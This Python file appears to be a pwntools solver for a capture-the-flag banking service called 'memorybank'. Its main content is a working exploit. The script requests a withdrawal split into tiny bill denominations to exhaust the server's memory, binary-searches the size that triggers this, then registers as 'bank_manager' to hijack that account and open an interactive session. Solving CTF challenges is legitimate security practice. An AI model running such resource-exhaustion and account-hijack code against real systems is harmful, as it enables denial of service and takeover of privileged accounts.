import os
import socket
from pwn import remote, log, process, tube, context
import time
from dotenv import load_dotenv

load_dotenv()

# context.log_level = "DEBUG"

HOST = os.environ.get("HOST", "")
PORT = 9005
TICKET = os.environ.get("TICKET", "")

REG_PROMPT = b"Please register with a username (or type 'exit' to quit): "
MENU_PROMPT = b"Choose an operation"
SIG_PROMPT = b"Enter your signature (will be used on bills): "
WITHDRAW_PROMPT = b"Enter amount to withdraw: "
DENOMINATION_PROMPT = b"Enter bill denomination: "


def do_connect_remote_pipe():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.settimeout(2)

    p = remote.fromsocket(sock)

    p.sendlineafter(b"Ticket please:", TICKET.encode())

    return p


def connect_remote_pipe():
    while True:
        try:
            p = do_connect_remote_pipe()
            return p
        except Exception as e:
            pass


def connect_local_pipe():
    p = process(
        "docker run -i --rm defcon25/memorybank:latest ",
        shell=True,
    )
    return p


def connect(local: bool):
    if local:
        return connect_local_pipe()
    else:
        return connect_remote_pipe()


class SlowDownAlert(Exception):
    pass


class RemoteOutOfMemory(Exception):
    pass


def do_exploit(p: tube, n: int):
    try:
        p.sendlineafter(REG_PROMPT, "random".encode())
    except EOFError:
        raise SlowDownAlert("Connection closed unexpectedly.")

    try:
        p.sendlineafter(MENU_PROMPT, "2".encode())
        p.sendlineafter(WITHDRAW_PROMPT, "101".encode())
        p.sendlineafter(DENOMINATION_PROMPT, str(101 / n).encode())

        p.sendlineafter(MENU_PROMPT, b"4")
    except EOFError:
        log.info("=====> OOM")
        raise RemoteOutOfMemory()

    return None


def enter_bank_manager(p: tube):
    log.info("Trying to hijack 'bank_manager' account ...")
    p.sendlineafter(REG_PROMPT, b"bank_manager")
    data = p.recvline(timeout=2)
    if b"already exists" in data:
        return False

    log.success("Hijacked 'bank_manager' account!")
    p.sendlineafter(MENU_PROMPT, b"6")
    p.interactive()

    return True


def do_solve(local: bool, n: None | int = None) -> None:
    try:
        p = connect(local)
        do_exploit(p, (2525000 if local else 290000) if not n else n)

        ret = enter_bank_manager(p)
        if not ret:
            # log.info("  - Failed to hijack bank_manager account!")
            return 0

        return 1
    finally:
        p.close()


def solve(local: bool, n: None | int = None) -> None:
    while True:
        try:
            return do_solve(local, n)
        except SlowDownAlert:
            log.info("  - waiting for 2 seconds...")
            time.sleep(2)


def bsearch(local: bool, high, low) -> None:
    while low < high:
        mid = (high + low) // 2
        log.info("*" * 100)
        log.info(f"Trying {low} <= {mid} <= {high}")

        p = connect(local)
        try:
            do_exploit(p, mid)

            low = mid + 1
        except RemoteOutOfMemory:
            high = mid
        finally:
            p.close()


def main():
    # solve(local=False, n=282150)
    bsearch(local=True, high=1000000000, low=20000000)


if __name__ == "__main__":
    main()
